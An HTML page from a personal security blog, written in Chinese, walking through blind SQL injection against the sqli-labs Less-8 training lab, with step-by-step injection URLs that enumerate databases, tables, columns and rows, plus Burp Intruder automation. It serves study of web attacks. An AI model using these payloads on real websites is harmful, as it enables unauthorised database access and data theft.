@@ -1,0 +1,1093 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="han个人博客">
+    <title>练习10 - han个人博客</title>
+    <meta name="author" content="han">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 盲注总结，目标站点是 sqli-labs 中的 Less-8\n\n\n\n\n\n\n找注入点拿到一个目标站点首先找到注入点，Less-8 注入点为 ?id=1\n判断类型发现输入 id=1&#39; 后页面的 You are in ... 消失了，没有报错信息。\n1http://192.168.100.52/sqli-labs/Less-8/?id=1'\n\n再次输入\n1http://192.168.100.52/sqli-labs/Less-8/?id=1' --+\n\n页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。\n判断数据库个数1http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+\n\n\n发现 &gt;4正常显示，&gt;5不正常，故可知数据库个数为 5。\n判断各数据库名的长度先判断第一个数据库名的长度\n1http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+\n\n\n可得第一个库的长度为 18 。\n判断数据库名1http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+\n\n可得第一个字符为 i 。\n\n继续往下做判断\n1http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+\n\n\n可得第二个字符是 n\n可以以此判断出数据库中各个库名。\n判断当前数据库中表的个数1http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+\n\n\n判断当前数据库中各个表名的长度先判断第一个表名长度\n1http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+\n\n\n判断当前数据库中表名判断第一个表名\n1http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+\n\n\n字符为 e ，继续判断可以得出该表名为 emails。\n查看 users 表中字段个数1http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+\n\n\n个数为 3 。\n判断 users 表中第一个字段长度1http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+\n\n第一个字段长度为 2 。\n判断第一个字段1http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+\n\n\n不难判断出第一个字段为 id。\n判断users 表行数1http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+\n\n\n可以查看 users表中的内容。\n总结 SQL 盲注流程\n先找注入点\n判断类型\n字符型？整型？\n盲注还是 UNION SELECT\n\n\n先查一共有几个数据库\n再查各个数据库长度，为判断库名做准备\n依次判断出数据库的名称，找到自己想要查询的库\n先查库中有几个表\n查各个表的长度\n依次判断出各个表名\n查表中有几个字段\n查各个字段长度\n依次判断字段名\n判断出想要字段的数据\n\n用burpsuite判断把要做判断的 url 发送到 Intruder\n\n点击 Clear $ ，在 =%27i%27 中字母 i 两边加上 $ ，然后点击 Payloads，在 Payload type 选择 Brute forcer，Min length 选择 1，Max length 选择 1。\n\n然后点击 Start attack\n\n\n继续改变位置可查出库名，同理表名，字段名也可以查出。\n","dateCreated":"2019-08-28T19:40:45+08:00","dateModified":"2019-08-29T00:24:16+08:00","datePublished":"2019-08-28T19:40:45+08:00","description":"Abstract: SQL 盲注总结，目标站点是 sqli-labs 中的 Less-8","headline":"练习10","image":["https://images.unsplash.com/photo-1557906858-1bdc35fc75e5?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/28/practice10/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/28/practice10/","keywords":"SQL盲注","thumbnailUrl":"https://images.unsplash.com/photo-1557906858-1bdc35fc75e5?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80"}</script>
+    <meta name="description" content="Abstract: SQL 盲注总结，目标站点是 sqli-labs 中的 Less-8">
+<meta name="keywords" content="SQL盲注">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="练习10">
+<meta property="og:url" content="http://yoursite.com/2019/08/28/practice10/index.html">
+<meta property="og:site_name" content="han个人博客">
+<meta property="og:description" content="Abstract: SQL 盲注总结，目标站点是 sqli-labs 中的 Less-8">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/127errorInjec_count.png">
+<meta property="og:image" content="http://yoursite.com/images/128fires_schemata_length.png">
+<meta property="og:image" content="http://yoursite.com/images/125errorInjec_schema.png">
+<meta property="og:image" content="http://yoursite.com/images/126errorInjec_judge_schemata.png">
+<meta property="og:image" content="http://yoursite.com/images/129count_current_database_tables.png">
+<meta property="og:image" content="http://yoursite.com/images/130count_current_table_length.png">
+<meta property="og:image" content="http://yoursite.com/images/130juage_table_name.png">
+<meta property="og:image" content="http://yoursite.com/images/131.png">
+<meta property="og:image" content="http://yoursite.com/images/133.png">
+<meta property="og:image" content="http://yoursite.com/images/134.png">
+<meta property="og:image" content="http://yoursite.com/images/135.png">
+<meta property="og:image" content="http://yoursite.com/images/136.png">
+<meta property="og:image" content="http://yoursite.com/images/137.png">
+<meta property="og:image" content="http://yoursite.com/images/138.png">
+<meta property="og:updated_time" content="2019-08-28T16:24:16.170Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="练习10">
+<meta name="twitter:description" content="Abstract: SQL 盲注总结，目标站点是 sqli-labs 中的 Less-8">
+<meta name="twitter:image" content="http://yoursite.com/images/127errorInjec_count.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
+    
+    
+        <meta property="og:image" content="https://images.unsplash.com/photo-1557906858-1bdc35fc75e5?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1557906858-1bdc35fc75e5?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80"/>
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-apbcs1por3ly2xr25bjnwqewpfn9wrdfbucv3jdunxv2vrrgeivtgtwgojwn.min.css">
+    <!--STYLES END-->
+    
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            han个人博客
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">han</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>life and code</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="Categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="Tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="Archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="Search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="About"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="noopener" title="Stack Overflow">
+                    
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/mailto"
+                            title="Mail"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            练习10
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-08-28T19:40:45+08:00">
+	
+		    Aug 28, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>Abstract</strong>: SQL 盲注总结，目标站点是 <code>sqli-labs</code> 中的 <code>Less-8</code></p>
+<a id="more"></a>
+
+<!--export-->
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#找注入点"><span class="toc-text">找注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断类型"><span class="toc-text">判断类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断数据库个数"><span class="toc-text">判断数据库个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断各数据库名的长度"><span class="toc-text">判断各数据库名的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断数据库名"><span class="toc-text">判断数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断当前数据库中表的个数"><span class="toc-text">判断当前数据库中表的个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断当前数据库中各个表名的长度"><span class="toc-text">判断当前数据库中各个表名的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断当前数据库中表名"><span class="toc-text">判断当前数据库中表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看-users-表中字段个数"><span class="toc-text">查看 users 表中字段个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断-users-表中第一个字段长度"><span class="toc-text">判断 users 表中第一个字段长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断第一个字段"><span class="toc-text">判断第一个字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断users-表行数"><span class="toc-text">判断users 表行数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-SQL-盲注流程"><span class="toc-text">总结 SQL 盲注流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用burpsuite判断"><span class="toc-text">用burpsuite判断</span></a></li></ol>
+
+<h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p>拿到一个目标站点首先找到注入点，<code>Less-8</code> 注入点为 <code>?id=1</code></p>
+<h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>发现输入 <code>id=1&#39;</code> 后页面的 <code>You are in ...</code> 消失了，没有报错信息。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1'</span><br></pre></td></tr></table></figure>
+
+<p>再次输入</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' --+</span><br></pre></td></tr></table></figure>
+
+<p>页面正常显示，所以该注入点为字符型注入，由于页面不显示错误信息，所以使用盲注的方法。</p>
+<h3 id="判断数据库个数"><a href="#判断数据库个数" class="headerlink" title="判断数据库个数"></a>判断数据库个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(schema_name) from information_schema.schemata)&gt;4 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127errorInjec_count.png" alt></p>
+<p>发现 <code>&gt;4</code>正常显示，<code>&gt;5</code>不正常，故可知数据库个数为 5。</p>
+<h3 id="判断各数据库名的长度"><a href="#判断各数据库名的长度" class="headerlink" title="判断各数据库名的长度"></a>判断各数据库名的长度</h3><p>先判断第一个数据库名的长度</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select schema_name from information_schema.schemata limit 0,1))&gt;17 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/128fires_schemata_length.png" alt></p>
+<p>可得第一个库的长度为 18 。</p>
+<h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure>
+
+<p>可得第一个字符为 <code>i</code> 。</p>
+<p><img src="/images/125errorInjec_schema.png" alt></p>
+<p>继续往下做判断</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select schema_name from information_schema.schemata limit 0, 1), 1, 1)) &gt;109 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/126errorInjec_judge_schemata.png" alt></p>
+<p>可得第二个字符是 <code>n</code></p>
+<p>可以以此判断出数据库中各个库名。</p>
+<h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/129count_current_database_tables.png" alt></p>
+<h3 id="判断当前数据库中各个表名的长度"><a href="#判断当前数据库中各个表名的长度" class="headerlink" title="判断当前数据库中各个表名的长度"></a>判断当前数据库中各个表名的长度</h3><p>先判断第一个表名长度</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/130count_current_table_length.png" alt></p>
+<h3 id="判断当前数据库中表名"><a href="#判断当前数据库中表名" class="headerlink" title="判断当前数据库中表名"></a>判断当前数据库中表名</h3><p>判断第一个表名</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) &gt;100 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/130juage_table_name.png" alt></p>
+<p>字符为 <code>e</code> ，继续判断可以得出该表名为 <code>emails</code>。</p>
+<h3 id="查看-users-表中字段个数"><a href="#查看-users-表中字段个数" class="headerlink" title="查看 users 表中字段个数"></a>查看 <code>users</code> 表中字段个数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') &gt; 2 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/131.png" alt></p>
+<p>个数为 3 。</p>
+<h3 id="判断-users-表中第一个字段长度"><a href="#判断-users-表中第一个字段长度" class="headerlink" title="判断 users 表中第一个字段长度"></a>判断 <code>users</code> 表中第一个字段长度</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 1 --+</span><br></pre></td></tr></table></figure>
+
+<p>第一个字段长度为 2 。</p>
+<h3 id="判断第一个字段"><a href="#判断第一个字段" class="headerlink" title="判断第一个字段"></a>判断第一个字段</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and ascii(mid((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0, 1), 1, 1)) &gt;104 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/133.png" alt></p>
+<p>不难判断出第一个字段为 <code>id</code>。</p>
+<h3 id="判断users-表行数"><a href="#判断users-表行数" class="headerlink" title="判断users 表行数"></a>判断<code>users</code> 表行数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52/sqli-labs/Less-8/?id=1' and (select count(*) from security.users) &gt;13 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/134.png" alt></p>
+<p>可以查看 <code>users</code>表中的内容。</p>
+<h3 id="总结-SQL-盲注流程"><a href="#总结-SQL-盲注流程" class="headerlink" title="总结 SQL 盲注流程"></a>总结 SQL 盲注流程</h3><ol>
+<li>先找注入点</li>
+<li>判断类型<ol>
+<li>字符型？整型？</li>
+<li>盲注还是 <code>UNION SELECT</code></li>
+</ol>
+</li>
+<li>先查一共有几个数据库</li>
+<li>再查各个数据库长度，为判断库名做准备</li>
+<li>依次判断出数据库的名称，找到自己想要查询的库</li>
+<li>先查库中有几个表</li>
+<li>查各个表的长度</li>
+<li>依次判断出各个表名</li>
+<li>查表中有几个字段</li>
+<li>查各个字段长度</li>
+<li>依次判断字段名</li>
+<li>判断出想要字段的数据</li>
+</ol>
+<h3 id="用burpsuite判断"><a href="#用burpsuite判断" class="headerlink" title="用burpsuite判断"></a>用burpsuite判断</h3><p>把要做判断的 <code>url</code> 发送到 <code>Intruder</code></p>
+<p><img src="/images/135.png" alt></p>
+<p>点击 <code>Clear $</code> ，在 <code>=%27i%27</code> 中字母 <code>i</code> 两边加上 <code>$</code> ，然后点击 <code>Payloads</code>，在 <code>Payload type</code> 选择 <code>Brute forcer</code>，<code>Min length</code> 选择 <code>1</code>，<code>Max length</code> 选择 <code>1</code>。</p>
+<p><img src="/images/136.png" alt></p>
+<p>然后点击 <code>Start attack</code></p>
+<p><img src="/images/137.png" alt></p>
+<p><img src="/images/138.png" alt></p>
+<p>继续改变位置可查出库名，同理表名，字段名也可以查出。</p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/SQL盲注/">SQL盲注</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/08/29/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/08/28/note33/"
+                    data-tooltip="note33"
+                    aria-label="NEXT: note33"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 han. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/08/29/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/08/28/note33/"
+                    data-tooltip="note33"
+                    aria-label="NEXT: note33"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/08/28/practice10/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/28/practice10/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/28/practice10/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/08/28/practice10/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">han</h4>
+        
+            <div id="about-card-bio"><p>life and code</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Web Security</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Beijing, China
+            </div>
+        
+    </div>
+</div>
+
+        
